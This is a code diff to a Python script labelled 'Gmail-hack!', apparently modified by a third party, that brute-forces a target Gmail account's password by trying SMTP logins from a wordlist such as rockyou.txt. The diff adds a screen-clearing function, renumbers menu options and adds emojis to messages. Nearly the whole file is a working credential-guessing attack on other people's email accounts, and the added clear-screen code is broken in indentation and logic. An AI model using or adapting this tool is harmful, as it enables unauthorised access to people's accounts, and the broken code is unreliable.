@@ -9,7 +9,7 @@ def artwork():
     print("#                     |  @___oo                          #")
     print("#           /\  /\   / (__,,,,|                          #")
     print("#          ) /^\) ^\/ _)                Gmail-hack!      #")
-    print("#          )   /^\/   _)                                 #")
+    print("#          )   /^\/   _)            tweaked by mv4z      #")
     print("#          )   _ /  / _)                                 #")
     print("#      /\  )/\/ ||  | )_)                                #")
     print("#     <  >      |(,,) )__)                               #")
@@ -20,25 +20,31 @@ def artwork():
     print("##########################################################")
     print("\n")
     
-    
+def cls():
+if os == "nt":    # windows is classified as "nt"
+    os.system("cls")
+else:
+    os.system("clear")
+
+cls()
 artwork()
 smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
 
 smtpserver.ehlo()
 smtpserver.starttls()
 
-user = input("Enter The Target Gmail Adress => ")
+user = input("Enter The Target Gmail Address => ")
 
 print("\n")
 
-pwd = input("Enter '0' to use the inbuilt passwords list \nEnter '2' to Add a custom password list\n => ")
+pwd = input("Enter '0' to use the inbuilt passwords list \nEnter '1' to Add a custom password list\n => ")
 
 if pwd=='0':
     passswfile="rockyou.txt"
 
-elif pwd=='2':
+elif pwd=='1':
     print("\n")
-    passswfile = input("Name The File Path (For Password List) => ")
+    passswfile = input("Name The File Path (passlist) => ")
 
 else:
     print("\n")
@@ -55,10 +61,11 @@ for password in passswfile:
     try:
         smtpserver.login(user, password)
 
-        print("[+] Password Found %s" % password)
+        print("[+] Password Grabbed 🔥 %s" % password)
         break
 
     except smtplib.SMTPAuthenticationError:
-        print("[!] Pasword Is Wrong. %s " % password)
+        print("[!] Pasword Is Wrong ❌. %s " % password)
+
 
 
